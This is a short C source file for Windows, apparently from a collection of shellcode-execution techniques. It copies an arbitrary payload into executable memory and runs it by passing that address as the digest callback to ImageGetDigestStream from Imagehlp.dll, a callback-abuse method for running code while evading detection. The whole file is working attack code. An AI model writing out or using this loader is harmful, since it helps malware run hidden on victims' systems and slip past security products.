#include "Win32Helper.h"



VOID InvokeImageGetDigestStreamCallbackRoutine(LPVOID lpParameter)
{
	WCHAR DefaultBinaryPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Windows\\System32\\ntdll.dll";
	HANDLE hImage = NULL;
	HANDLE hDispose = NULL;
	IMAGEGETDIGESTSTREAM ImageGetDigestStream = NULL;
	HMODULE hMod = NULL;

	hMod = LoadLibraryW(L"Imagehlp.dll");
	if (hMod == NULL)
		return;

	ImageGetDigestStream = (IMAGEGETDIGESTSTREAM)GetProcAddressA((DWORD64)hMod, "ImageGetDigestStream");
	if (!ImageGetDigestStream)
		return;

	hImage = CreateFileW(DefaultBinaryPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hImage == INVALID_HANDLE_VALUE)
		return;

	ImageGetDigestStream(hImage, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, lpParameter, &hDispose);
		
	if(hDispose)
		CloseHandle(hDispose);
	
	if(hImage)
		CloseHandle(hImage);
}

BOOL MpfSceViaImageGetDigestStream(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeImageGetDigestStreamCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}